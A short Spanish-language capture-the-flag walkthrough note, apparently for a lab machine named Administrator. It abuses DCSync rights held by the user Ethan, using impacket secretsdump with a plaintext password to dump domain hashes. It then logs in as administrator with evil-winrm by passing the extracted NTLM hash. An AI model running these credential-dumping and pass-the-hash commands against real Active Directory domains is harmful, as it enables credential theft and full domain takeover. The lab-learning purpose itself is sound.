#getchanges

---

Marcamos que somos owner del usuario *Ethan* y en *First Degree Object Control* nos aparece que podemos pasar al usuario *administrator* abusando de los privilegios. [[DcSync]] [[GetChanges]] o [[GetchangesAll]] . El ultimo permiso que falta en help decia que estaba bug
![[Administrator50.png]]

![[Administrator51.png]]
Nos dice que podemos usar [[impacket-secretsdump]] con el comando `secretsdump.py 'administrator.htb'/'ethan':'limpbizkit'@'administrator.htb'`

![[Imagenes/Administrator52.png]]
Nos da los hashes de todos los usuarios, a nosotros nos interesa solo el del usuario *Administrator* y solamente vamos a tomar todo lo que viene despues de los ultimos *:*
```
3dc553ce4b9fd20bd016e098d2d2fd2e
```

Ahora nos conectamos con [[evil-winrm]] usamos `evil-winrm -u administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e' -i 10.129.112.167`